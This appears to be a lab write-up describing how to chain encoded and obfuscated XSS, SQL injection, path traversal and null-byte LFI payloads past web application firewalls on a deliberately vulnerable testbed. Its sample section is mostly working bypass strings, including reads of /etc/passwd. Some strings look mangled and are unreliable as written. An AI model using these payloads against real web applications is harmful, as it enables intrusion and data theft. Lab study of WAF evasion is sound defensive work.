# 🔗 Tool 1 – Payload Chaining (WAF Bypass)

## 🎯 Objective

Craft and test **layered payloads** that combine multiple evasion techniques like encoding, logic manipulation, path traversal, and injection chaining to evade Web Application Firewalls (WAFs).

---

## 🧪 Target Environment

- **Target IP:** http://192.168.1.110
- **Testbed:** DVWA / Mutillidae behind ModSecurity or Cloudflare
- **Tools:** Burp Suite, browser, encoded payloads

---

## 📁 Output Files

📄 `logs/payload-chain.txt`  
- Contains a variety of XSS, SQLi, LFI, and Path Traversal payloads  
- Each crafted using encoding, obfuscation, and null byte injection

📷 `screenshots/payload-chain-test.png`  
- Screenshot simulating terminal or Burp Suite results

## 🧬 Payload Samples

### ✅ XSS Bypass Examples

Original: <script>alert(1)</script>
Obfuscated:
%3Cscript%3Ealert%281%29%3C/script%3E
\u003Cscript\u003Ealert(1)\u003C/script\u003E
<scr<script>ipt>alert(1)</scr<script>ipt>

### ✅ SQL Injection Bypass

Original: ' OR 1=1--
Obfuscated:
%27%20OR%201%3D1--
/!50000OR/1=1--
%27//OR//1%3D1--

### ✅ Path Traversal Bypass

Original: ../../etc/passwd
Obfuscated:
..%2f..%2fetc/passwd
....//....//etc/passwd
..\..\etc\passwd

### ✅ LFI with Null Byte Injection

/index.php?file=../../etc/passwd%00

## 🧠 What I Learned

- How attackers use **multi-layered payloads** to bypass detection systems
- The significance of encoding and logic manipulation in real-world scenarios
- How WAFs parse different encoding formats and inconsistencies
- Prepping filters for evasion-resistant detection in Blue Team defenses
